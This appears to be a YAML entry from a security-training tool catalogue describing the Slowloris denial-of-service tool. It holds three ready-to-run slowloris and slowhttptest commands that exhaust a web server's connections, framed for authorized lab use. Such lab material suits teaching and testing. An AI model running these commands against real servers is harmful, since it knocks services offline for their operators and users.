tool: slowloris
tags:
- m12
- wireless
- attack
- dos
exam_hint: Slowloris holds HTTP connections open with partial requests to exhaust server pools — test only on infrastructure you own. Strategy — isolate DoS tools to lab VLANs; never run against unauthorized targets.
docs:
- https://github.com/gkbrk/slowloris
actions:
- title: Run Slowloris against owned lab web server
  desc: Opens many slow HTTP connections to measure how your lab web server handles connection exhaustion.
  command: slowloris -dns {{target|lab.local}} -port {{port|80}} -timeout {{timeout|240}} -s {{sockets|500}}
- title: Slowloris with custom socket count
  desc: Increases parallel partial connections — tune down if testing a small lab VM.
  command: slowloris -dns {{target|lab.local}} -port {{port|80}} -s {{sockets|200}} -timeout {{timeout|300}}
- title: Slow HTTP test with slowhttptest
  desc: Alternative slow GET attack using slowhttptest on authorized lab web infrastructure.
  command: slowhttptest -c {{connections|500}} -H -g -o {{output|slowloris}} -i {{interval|10}} -r {{rate|200}} -t GET -u {{target|http://192.168.1.10/}} -x {{timeout|24}}
